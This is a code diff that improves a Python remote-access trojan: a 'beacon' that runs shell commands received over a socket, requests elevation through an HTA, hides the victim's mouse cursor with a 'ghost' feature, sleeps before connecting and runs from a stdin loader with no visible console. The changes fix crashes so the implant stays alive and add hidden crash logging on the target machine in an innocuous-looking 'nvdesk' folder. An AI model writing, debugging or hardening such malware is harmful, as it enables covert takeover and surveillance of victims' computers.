@@ -15,6 +15,7 @@ import threading
 import glob
 import zipfile
 import urllib.request
+import traceback
 
 try:
     from _build_id import BUILD_ID
@@ -1372,8 +1373,13 @@ def _ghost_engage() -> bool:
         return False
     import ctypes
     u32 = ctypes.windll.user32
-    u32.GetModuleHandleW.restype = ctypes.c_void_p
-    u32.GetModuleHandleW.argtypes = (ctypes.c_wchar_p,)
+    k32 = ctypes.windll.kernel32
+    # GetModuleHandleW is exported by kernel32, NOT user32. Reading it off
+    # user32 raised AttributeError on every ghost engage, which propagated
+    # out of the unguarded dispatch handlers (overlay on / cursor block /
+    # ghost on) and silently killed the beacon process.
+    k32.GetModuleHandleW.restype = ctypes.c_void_p
+    k32.GetModuleHandleW.argtypes = (ctypes.c_wchar_p,)
     u32.CreateCursor.restype = ctypes.c_void_p
     u32.CreateCursor.argtypes = (ctypes.c_void_p, ctypes.c_int, ctypes.c_int,
                                  ctypes.c_int, ctypes.c_int, ctypes.c_void_p,
@@ -1382,7 +1388,10 @@ def _ghost_engage() -> bool:
     u32.SetSystemCursor.argtypes = (ctypes.c_void_p, ctypes.c_uint)
     u32.DestroyCursor.restype = ctypes.c_bool
     u32.DestroyCursor.argtypes = (ctypes.c_void_p,)
-    hmod = u32.GetModuleHandleW(None)
+    try:
+        hmod = k32.GetModuleHandleW(None)
+    except Exception:
+        hmod = None
     if not hmod:
         return False
     and_bits = ctypes.create_string_buffer(b"\xff" * 128)   # 32*32/8, all 1s
@@ -1417,19 +1426,71 @@ def _ghost_engage() -> bool:
     return False
 
 
+def _ghost_slot_restore_fallback(u32) -> bool:
+    """Belt-and-braces restore: point every OCR slot back at the stock
+    system cursor for that slot id so the pointer is guaranteed visible even
+    when SPI_SETCURSORS refuses to cooperate. SetSystemCursor takes
+    ownership of the handle it is given, so each slot gets a private copy of
+    the shared OCR cursor; copies that the system refuses are destroyed
+    here. Returns True when at least one slot was re-armed (the transparent
+    engage cursors are then no longer referenced by any slot)."""
+    try:
+        u32.LoadCursorW.restype = ctypes.c_void_p
+        u32.LoadCursorW.argtypes = (ctypes.c_void_p, ctypes.c_void_p)
+        u32.CopyIcon.restype = ctypes.c_void_p
+        u32.CopyIcon.argtypes = (ctypes.c_void_p,)
+        u32.SetSystemCursor.restype = ctypes.c_bool
+        u32.SetSystemCursor.argtypes = (ctypes.c_void_p, ctypes.c_uint)
+        u32.DestroyCursor.restype = ctypes.c_bool
+        u32.DestroyCursor.argtypes = (ctypes.c_void_p,)
+    except Exception:
+        return False
+    replaced = 0
+    for oid in _GHOST_OCR_IDS:
+        try:
+            stock = u32.LoadCursorW(None, oid)
+            if not stock:
+                continue
+            copy = u32.CopyIcon(stock)
+            if not copy:
+                continue
+            if u32.SetSystemCursor(copy, oid):
+                replaced += 1
+            else:
+                u32.DestroyCursor(copy)
+        except Exception:
+            pass          # best effort: never raise from a restore path
+    if replaced:
+        _ghost_state["cursors"] = []
+        _ghost_state["on"] = False
+        return True
+    return False
+
+
 def _ghost_disengage() -> bool:
     """Restore the user's saved cursor scheme with SPI_SETCURSORS, which
     reloads it from the profile and frees every transparent cursor we
-    installed. State is only cleared when the call reports success."""
+    installed. State is only cleared when the restore reports success.
+
+    fWinIni deliberately omits SPIF_SENDCHANGE (0x1): on interactive
+    sessions the broadcast makes SPI_SETCURSORS return FALSE with
+    GetLastError 0, which previously left the pointer invisible. A plain
+    session-wide reload (fWinIni=0, or 0x2 to also persist the intact
+    scheme) returns TRUE. If SPI still fails, _ghost_slot_restore_fallback
+    re-arms every OCR slot from the stock cursors as a second net."""
     if os.name != "nt":
         return False
     import ctypes
+    u32 = ctypes.windll.user32
     try:
-        u32 = ctypes.windll.user32
         u32.SystemParametersInfoW.restype = ctypes.c_bool
         u32.SystemParametersInfoW.argtypes = (ctypes.c_uint, ctypes.c_uint,
                                               ctypes.c_void_p, ctypes.c_uint)
-        ok = bool(u32.SystemParametersInfoW(0x0057, 0, None, 0x1 | 0x2))
+        ok = False
+        for fwin in (0, 0x2):
+            if u32.SystemParametersInfoW(0x0057, 0, None, fwin):
+                ok = True
+                break
     except Exception:
         ok = False
     if ok:
@@ -1437,7 +1498,8 @@ def _ghost_disengage() -> bool:
         # nothing double-frees them later
         _ghost_state["cursors"] = []
         _ghost_state["on"] = False
-    return ok
+        return True
+    return _ghost_slot_restore_fallback(u32)
 
 
 def _ghost_ref_add(tag: str) -> bool:
@@ -2372,6 +2434,43 @@ def _beacon_log(msg: str) -> None:
         pass
 
 
+def _enable_crash_log() -> None:
+    """Route unhandled Python exceptions + native faults (faulthandler) to
+    crash.log next to the admin beacon log so failures are visible
+    target-side. The loader feeds this script via stdin with no console or
+    stderr, so an early silent death used to leave zero evidence;
+    faulthandler additionally dumps every thread on an access violation
+    (native crash / AV kill). Best-effort only - logging must never break
+    the beacon."""
+    try:
+        d = os.path.join(_stream_state_path(), "nvdesk")
+        os.makedirs(d, exist_ok=True)
+        f = open(os.path.join(d, "crash.log"), "a", encoding="utf-8",
+                 errors="replace")
+        try:
+            import faulthandler
+            faulthandler.enable(file=f)
+        except Exception:
+            pass
+
+        def _hook(tp, val, tb):
+            try:
+                from datetime import datetime
+                f.write("\n=== %s unhandled %s: %s ===\n" % (
+                    datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                    getattr(tp, "__name__", tp), val))
+                traceback.print_exception(tp, val, tb, file=f)
+                f.flush()
+            except Exception:
+                pass
+            sys.__excepthook__(tp, val, tb)   # keep default exit behavior
+
+        sys.excepthook = _hook
+        sys.stderr = f     # stray thread tracebacks/prints land in the log
+    except Exception:
+        pass
+
+
 def _elev_launch_cmd() -> str:
     """Command line the elevated HTA must run to start a new elevated beacon.
     Returns "" if unresolvable (the HTA then logs NO_LAUNCH_CMD instead of
@@ -2539,6 +2638,24 @@ def request_admin() -> str:
 
 
 def execute_command(cmd: str) -> bytes:
+    """Dispatch a command and always come back alive. A handler exception
+    (overlay / cursor ghost paths historically raised and escaped the
+    socket loop's OSError-only guard, silently killing the beacon process)
+    is now converted into an in-band error reply, logged target-side, and
+    the session keeps running."""
+    try:
+        return _execute_command(cmd)
+    except Exception:
+        tb = traceback.format_exc()
+        try:
+            _beacon_log("[crash] command handler crashed:\n" + tb)
+        except Exception:
+            pass
+        return ("[!] command crashed (session kept alive):\n%s\n" % tb
+                ).encode("utf-8", errors="replace") + MARKER
+
+
+def _execute_command(cmd: str) -> bytes:
     """Run a shell command and return its output. Handles cd persistently."""
     low = cmd.strip().lower()
 
@@ -2708,6 +2825,7 @@ def connect() -> None:
 
 
 if __name__ == "__main__":
+    _enable_crash_log()   # crashes must leave evidence (no visible stderr)
     try:
         lo, hi = PRE_CONNECT_SLEEP
         if hi > 0 and os.environ.get("RAT_FAST") != "1":
